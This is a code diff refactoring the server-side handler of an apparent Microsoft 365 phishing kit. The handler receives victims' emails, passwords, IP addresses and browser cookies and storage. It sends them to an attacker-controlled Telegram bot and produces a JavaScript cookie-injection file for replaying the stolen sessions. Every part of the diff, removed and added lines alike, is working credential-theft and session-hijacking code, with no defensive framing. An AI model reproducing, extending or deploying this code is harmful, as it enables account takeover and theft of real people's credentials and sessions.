@@ -6,15 +6,9 @@ export const handler = async (event, context) => {
     'Access-Control-Allow-Methods': 'POST, OPTIONS',
   };
 
-  // Handle preflight requests
   if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers,
-      body: '',
-    };
+    return { statusCode: 200, headers, body: '' };
   }
-
   if (event.httpMethod !== 'POST') {
     return {
       statusCode: 405,
@@ -23,269 +17,236 @@ export const handler = async (event, context) => {
     };
   }
 
-  // DEBUG: Log entry point and incoming body
-  console.log("sendTelegram called! Event body:", event.body);
+  // Helper: send error notification to Telegram
+  async function sendErrorTelegram(msg, extra) {
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text:
+            `🚨 <b>MICROSOFT 365 ERROR</b>\n${msg}\n\n${extra ? '<code>' + (typeof extra === 'string' ? extra : JSON.stringify(extra)).substring(0, 1500) + '</code>' : ''}\n${new Date().toISOString()}`,
+          parse_mode: 'HTML',
+        }),
+      });
+    } catch (e) {
+      console.error('❌ Failed to send error notification to Telegram:', e);
+    }
+  }
 
   try {
     let data;
     try {
       data = JSON.parse(event.body);
     } catch (parseError) {
-      console.error('❌ JSON parse error:', parseError, 'Raw body:', event.body);
+      await sendErrorTelegram('JSON parse error', event.body);
       return {
         statusCode: 400,
         headers,
-        body: JSON.stringify({ 
-          error: 'Invalid JSON in request body',
-          details: parseError.message,
-        }),
+        body: JSON.stringify({ error: 'Invalid JSON', details: parseError.message }),
       };
     }
 
-    // Check environment variables for Telegram
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
-    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-
-    // Log env presence (mask actual values)
-    console.log('TELEGRAM_BOT_TOKEN set?', !!TELEGRAM_BOT_TOKEN, 'TELEGRAM_CHAT_ID set?', !!TELEGRAM_CHAT_ID);
-    console.log('UPSTASH_REDIS_REST_URL set?', !!UPSTASH_REDIS_REST_URL, 'UPSTASH_REDIS_REST_TOKEN set?', !!UPSTASH_REDIS_REST_TOKEN);
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('❌ Missing Telegram configuration at runtime');
+      await sendErrorTelegram('Missing Telegram env config', {});
       return {
         statusCode: 500,
         headers,
-        body: JSON.stringify({ 
-          error: 'Server configuration error - Telegram credentials missing'
-        }),
+        body: JSON.stringify({ error: 'Telegram configuration missing' }),
       };
     }
 
-    // Extract data from body
-    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;
-
-    console.log('📝 Received data:', {
-      email,
-      hasCookies: !!browserFingerprint?.cookies,
-      cookiesType: typeof browserFingerprint?.cookies,
-      cookiesLength: Array.isArray(browserFingerprint?.cookies) ? browserFingerprint.cookies.length : 'N/A'
-    });
-
-    // Get client IP with better detection
-    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                     event.headers['x-real-ip'] || 
-                     event.headers['cf-connecting-ip'] || 
-                     event.requestContext?.identity?.sourceIp ||
-                     'Unknown';
-
-    // Enhanced cookie processing
-    const cookieInfo = browserFingerprint?.cookies || data.cookies || [];
-    const localStorageInfo = browserFingerprint?.localStorage || data.localStorage || 'Empty';
-    const sessionStorageInfo = browserFingerprint?.sessionStorage || data.sessionStorage || 'Empty';
-    
-    console.log('🍪 Processing cookies:', { 
-      type: typeof cookieInfo,
-      isArray: Array.isArray(cookieInfo),
-      length: Array.isArray(cookieInfo) ? cookieInfo.length : 'N/A',
-      sample: Array.isArray(cookieInfo) && cookieInfo.length > 0 ? cookieInfo[0] : 'No cookies'
-    });
-
-    // Force .login.microsoftonline.com as the only allowed domain
+    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint } = data;
     let formattedCookies = [];
-    
-    // Method 1: Direct array
-    if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
-      formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name).map(cookie => ({
-        ...cookie,
-        domain: '.login.microsoftonline.com'
-      }));
-      console.log('✅ Method 1: Direct array, found', formattedCookies.length, 'cookies');
-    }
-    
-    // Method 2: Parse JSON string
-    else if (typeof cookieInfo === 'string' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty' && cookieInfo.trim() !== '') {
-      try {
-        const parsedCookies = JSON.parse(cookieInfo);
-        if (Array.isArray(parsedCookies)) {
-          formattedCookies = parsedCookies.filter(cookie => cookie && cookie.name).map(cookie => ({
-            ...cookie,
-            domain: '.login.microsoftonline.com'
-          }));
-          console.log('✅ Method 2: JSON parse, found', formattedCookies.length, 'cookies');
-        }
-      } catch (e) {
-        console.log('⚠️ JSON parsing failed, trying cookie string parsing');
-        // Method 3: Parse document.cookie format
-        if (cookieInfo.includes('=')) {
-          const cookieStrings = cookieInfo.split(';');
-          formattedCookies = cookieStrings
-            .map(cookieStr => {
-              const [name, ...valueParts] = cookieStr.trim().split('=');
-              const value = valueParts.join('=');
-              return name && value ? {
-                name: name.trim(),
-                value: value.trim(),
-                domain: '.login.microsoftonline.com',
-                path: '/',
-                secure: true,
-                httpOnly: false,
-                sameSite: 'none',
-                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-                hostOnly: false,
-                session: false,
-                storeId: null
-              } : null;
-            })
-            .filter(cookie => cookie !== null);
-          console.log('✅ Method 3: Cookie string parse, found', formattedCookies.length, 'cookies');
-        }
-      }
-    }
-    
-    // Method 4: Check for document.cookie direct format
-    else if (data.documentCookies && typeof data.documentCookies === 'string') {
-      const cookieStrings = data.documentCookies.split(';');
-      formattedCookies = cookieStrings
-        .map(cookieStr => {
-          const [name, ...valueParts] = cookieStr.trim().split('=');
-          const value = valueParts.join('=');
-          return name && value ? {
-            name: name.trim(),
-            value: value.trim(),
-            domain: '.login.microsoftonline.com',
-            path: '/',
-            secure: true,
-            httpOnly: false,
-            sameSite: 'none',
-            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-            hostOnly: false,
-            session: false,
-            storeId: null
-          } : null;
-        })
-        .filter(cookie => cookie !== null);
-      console.log('✅ Method 4: Document cookies, found', formattedCookies.length, 'cookies');
+    let cookieInfo =
+      data.formattedCookies ||
+      browserFingerprint?.cookies ||
+      data.cookies ||
+      data.documentCookies ||
+      [];
+
+    // Validate credentials
+    if (!email || !password) {
+      await sendErrorTelegram('Missing credentials', { email, password });
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Missing required fields', fields: { email, password } }),
+      };
     }
 
-    // Store session data in Redis
-    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
-    const sessionData = {
-      email: email || '',
-      password: password || 'Not captured',
-      provider: provider || 'Microsoft',
-      fileName: fileName || 'Microsoft 365 Access',
-      timestamp: timestamp || new Date().toISOString(),
-      sessionId,
-      clientIP,
-      userAgent: userAgent || 'Unknown',
-      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
-      cookies: cookieInfo,
-      localStorage: localStorageInfo,
-      sessionStorage: sessionStorageInfo,
-      browserFingerprint: browserFingerprint || {},
-      cookiesFileData: cookiesFileData || '',
-      formattedCookies: formattedCookies,
-      rawCookieData: data // Store all raw data for debugging
-    };
-
-    // Store in Redis if available
-    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
-      try {
-        const { Redis } = await import('@upstash/redis');
-        const redis = new Redis({
-          url: UPSTASH_REDIS_REST_URL,
-          token: UPSTASH_REDIS_REST_TOKEN,
-        });
-        
-        // Store with TTL of 24 hours
-        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
-        await redis.set(`user:${email}`, JSON.stringify(sessionData));
-        await redis.set(`cookies:${sessionId}`, JSON.stringify({
-          cookies: formattedCookies,
-          localStorage: localStorageInfo,
-          sessionStorage: sessionStorageInfo,
-          timestamp: timestamp,
-          email: email,
-          password: password
+    // Parse cookies, always using Microsoft domain
+    try {
+      if (Array.isArray(data.formattedCookies) && data.formattedCookies.length > 0) {
+        formattedCookies = data.formattedCookies.filter(c => c && c.name).map(c => ({
+          ...c,
+          domain: '.login.microsoftonline.com',
         }));
-        console.log('✅ Session data stored in Redis');
-      } catch (redisError) {
-        console.error('❌ Redis storage error:', redisError);
+      } else if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
+        formattedCookies = cookieInfo.filter(c => c && c.name).map(c => ({
+          ...c,
+          domain: '.login.microsoftonline.com',
+        }));
+      } else if (
+        typeof cookieInfo === 'string' &&
+        cookieInfo !== 'No cookies found' &&
+        cookieInfo !== 'Empty' &&
+        cookieInfo.trim() !== ''
+      ) {
+        try {
+          const parsedCookies = JSON.parse(cookieInfo);
+          if (Array.isArray(parsedCookies)) {
+            formattedCookies = parsedCookies.filter(c => c && c.name).map(c => ({
+              ...c,
+              domain: '.login.microsoftonline.com',
+            }));
+          }
+        } catch {
+          if (cookieInfo.includes('=')) {
+            const cookieStrings = cookieInfo.split(';');
+            formattedCookies = cookieStrings
+              .map(str => {
+                const [name, ...valueParts] = str.trim().split('=');
+                const value = valueParts.join('=');
+                return name && value
+                  ? {
+                      name: name.trim(),
+                      value: value.trim(),
+                      domain: '.login.microsoftonline.com',
+                      path: '/',
+                      secure: true,
+                      httpOnly: false,
+                      sameSite: 'none',
+                      expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
+                      hostOnly: false,
+                      session: false,
+                      storeId: null,
+                    }
+                  : null;
+              })
+              .filter(Boolean);
+          }
+        }
+      } else if (data.documentCookies && typeof data.documentCookies === 'string') {
+        const cookieStrings = data.documentCookies.split(';');
+        formattedCookies = cookieStrings
+          .map(str => {
+            const [name, ...valueParts] = str.trim().split('=');
+            const value = valueParts.join('=');
+            return name && value
+              ? {
+                  name: name.trim(),
+                  value: value.trim(),
+                  domain: '.login.microsoftonline.com',
+                  path: '/',
+                  secure: true,
+                  httpOnly: false,
+                  sameSite: 'none',
+                  expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
+                  hostOnly: false,
+                  session: false,
+                  storeId: null,
+                }
+              : null;
+          })
+          .filter(Boolean);
       }
+    } catch (cookieParseError) {
+      await sendErrorTelegram('Cookie parse error', cookieInfo);
+    }
+
+    if (!formattedCookies || formattedCookies.length === 0) {
+      await sendErrorTelegram('No cookies found for this submission', data);
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'No cookies found' }),
+      };
     }
 
     // Send main message to Telegram
-    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
-    
-    const message = `🔐 MICROSOFT 365 LOGIN CAPTURED
+    const clientIP =
+      event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+      event.headers['x-real-ip'] ||
+      event.headers['cf-connecting-ip'] ||
+      event.requestContext?.identity?.sourceIp ||
+      'Unknown';
+    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '')
+      ? '📱 Mobile'
+      : '💻 Desktop';
+    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
 
-📧 Email: ${email || 'Not captured'}
-🔑 Password: ${password || 'Not captured'}
+    const mainMessage = `🔐 MICROSOFT 365 LOGIN CAPTURED
+
+📧 Email: ${email}
+🔑 Password: ${password}
 🏢 Provider: ${provider || 'Microsoft'}
 🕒 Time: ${new Date().toLocaleString()}
 🌐 IP: ${clientIP} | ${deviceInfo}
 🍪 Cookies: ${formattedCookies.length} captured
+💾 LocalStorage: ${browserFingerprint?.localStorage !== 'Empty' ? 'Has Data' : 'Empty'}
+🗃️ SessionStorage: ${browserFingerprint?.sessionStorage !== 'Empty' ? 'Has Data' : 'Empty'}
 📱 User Agent: ${(userAgent || 'Unknown').substring(0, 100)}
-
 🆔 Session: ${sessionId}
-
 Download link: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionId}`;
 
-    console.log('📤 Sending main message to Telegram...');
-
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-      }),
-      signal: AbortSignal.timeout(15000),
-    });
-
-    if (!telegramResponse.ok) {
-      const errorText = await telegramResponse.text();
-      console.error('❌ Telegram API error:', errorText);
-      throw new Error(`Failed to send message: ${errorText}`);
+    let mainMessageOk = false;
+    try {
+      const tgResp = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mainMessage,
+            parse_mode: 'Markdown',
+          }),
+          signal: AbortSignal.timeout(15000),
+        }
+      );
+      if (!tgResp.ok) {
+        const errText = await tgResp.text();
+        await sendErrorTelegram('Main message failed', errText);
+      } else {
+        mainMessageOk = true;
+      }
+    } catch (err) {
+      await sendErrorTelegram('Main message (network) failed', err.message);
     }
 
-    console.log('✅ Main message sent to Telegram');
-
-    // Always try to send cookies file, even if empty (for debugging)
+    // Prepare cookies file
     let fileSent = false;
-    
     try {
-      console.log('📎 Preparing cookies file...');
-      
-      // Only Microsoft domain
-      const cookiesForFile = formattedCookies.length > 0 ? formattedCookies.map(cookie => ({
-        ...cookie,
-        domain: '.login.microsoftonline.com'
-      })) : [];
-      
-      // Create JavaScript injection code
-      const jsInjectionCode = cookiesForFile.length > 0 ? 
-        `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(cookiesForFile))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();` :
-        `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
+      const cookiesForFile = formattedCookies.map(c => ({
+        ...c,
+        domain: '.login.microsoftonline.com',
+      }));
+      const jsInjectionCode =
+        cookiesForFile.length > 0
+          ? `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(
+              JSON.stringify(cookiesForFile)
+            )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
+          : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
 
-      const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
+      const cookiesFileContent = `// Cookie Data for ${email} - ${new Date().toISOString()}
 // Provider: ${provider || 'Microsoft'}
 // IP: ${clientIP}
 // Microsoft 365 Session Data
 // Cookies Found: ${cookiesForFile.length}
 
 let ipaddress = "${clientIP}";
-let email = "${email || 'Not captured'}";
-let password = "${password || 'Not captured'}";
+let email = "${email}";
+let password = "${password}";
 
 // Raw Cookie Data Debug Info:
-// Original cookie info type: ${typeof cookieInfo}
-// Original cookie info: ${JSON.stringify(cookieInfo).substring(0, 200)}...
 // Formatted cookies count: ${cookiesForFile.length}
 
 ${jsInjectionCode}
@@ -294,144 +255,86 @@ ${jsInjectionCode}
 ${JSON.stringify(cookiesForFile, null, 2)}
 
 // Session Storage:
-// ${sessionStorageInfo}
+// ${browserFingerprint?.sessionStorage || ''}
 
 // Local Storage:
-// ${localStorageInfo}`;
+// ${browserFingerprint?.localStorage || ''}`;
 
-      const fileNameForUpload = `microsoft365_cookies_${(email || 'unknown').replace('@', '_at_').replace(/[^a-zA-Z0-9_]/g, '_')}_${Date.now()}.js`;
-
-      // Create multipart form data
+      const fileNameForUpload = `microsoft365_cookies_${email.replace(
+        '@',
+        '_at_'
+      )}_${Date.now()}.js`;
       const boundary = '----formdata-boundary-' + Math.random().toString(36);
-      
       let formData = '';
       formData += `--${boundary}\r\n`;
       formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
       formData += `${TELEGRAM_CHAT_ID}\r\n`;
-      
       formData += `--${boundary}\r\n`;
       formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
       formData += `Content-Type: text/javascript\r\n\r\n`;
       formData += cookiesFileContent;
       formData += `\r\n`;
-      
       formData += `--${boundary}--\r\n`;
 
-      console.log('📤 Sending cookies file to Telegram...');
+      const fileResp = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
+          body: formData,
+          signal: AbortSignal.timeout(30000),
+        }
+      );
 
-      // Send file to Telegram
-      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': `multipart/form-data; boundary=${boundary}`,
-        },
-        body: formData,
-        signal: AbortSignal.timeout(30000),
-      });
-
-      if (fileResponse.ok) {
-        console.log('✅ Cookies file sent successfully');
+      if (fileResp.ok) {
         fileSent = true;
       } else {
-        const fileErrorText = await fileResponse.text();
-        console.error('❌ File upload failed:', fileErrorText);
-        
+        const fileErrorText = await fileResp.text();
+        await sendErrorTelegram('File upload failed', fileErrorText);
         // Fallback: send as text message
-        const fallbackMessage = `📁 <b>MICROSOFT 365 COOKIES</b> (${cookiesForFile.length} cookies)\n\n<code>${cookiesFileContent.substring(0, 3500)}</code>\n\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;
-        
-        const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: fallbackMessage,
-            parse_mode: 'HTML',
-          }),
-        });
-        
+        const fallbackMessage = `📁 <b>MICROSOFT 365 COOKIES</b> (${cookiesForFile.length} cookies)\n\n<code>${cookiesFileContent.substring(
+          0,
+          3500
+        )}</code>\n\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;
+        const fallbackResponse = await fetch(
+          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: fallbackMessage,
+              parse_mode: 'HTML',
+            }),
+          }
+        );
         if (fallbackResponse.ok) {
-          console.log('✅ Cookies data sent as text message');
           fileSent = true;
         }
       }
     } catch (fileError) {
-      console.error('❌ Error sending cookies file:', fileError);
-      
-      // Final fallback - send debug info
-      try {
-        const debugInfo = `🔍 <b>MICROSOFT 365 DEBUG</b>\n\n👤 User: ${email || 'Not captured'}\n🍪 Cookies Found: ${formattedCookies.length}\n📊 Raw Data Type: ${typeof cookieInfo}\n📋 Raw Data: ${JSON.stringify(cookieInfo).substring(0, 200)}...\n\n<i>Microsoft 365 cookie processing completed with ${formattedCookies.length} cookies.</i>`;
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: debugInfo,
-            parse_mode: 'HTML',
-          }),
-        });
-        
-        console.log('✅ Debug info sent');
-        fileSent = true;
-      } catch (debugError) {
-        console.error('❌ All sending methods failed:', debugError);
-      }
+      await sendErrorTelegram('File send error', fileError.message);
     }
 
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify({ 
-        success: true, 
-        message: 'Data processed successfully',
-        sessionId: sessionId,
-        cookiesCollected: formattedCookies.length > 0,
+      body: JSON.stringify({
+        success: mainMessageOk && fileSent,
+        message: 'Data processed',
         cookieCount: formattedCookies.length,
-        fileSent: fileSent,
-        debug: {
-          originalCookieType: typeof cookieInfo,
-          processedCookieCount: formattedCookies.length,
-          rawDataAvailable: !!cookieInfo
-        }
+        fileSent,
       }),
     };
-
   } catch (error) {
-    console.error('❌ Error in sendTelegram function:', error);
-    
-    // Send error notification
-    try {
-      const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-      const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-      
-      if (BOT_TOKEN && CHAT_ID) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `🚨 <b>MICROSOFT 365 FUNCTION ERROR</b>\n\n<code>${error.message}</code>\n\n${new Date().toISOString()}`,
-            parse_mode: 'HTML',
-          }),
-        });
-      }
-    } catch (notificationError) {
-      console.error('❌ Failed to send error notification:', notificationError);
-    }
-    
+    await sendErrorTelegram('Handler-level error', error.message);
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ 
+      body: JSON.stringify({
         error: 'Internal server error',
         details: error.message,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
       }),
     };
   }
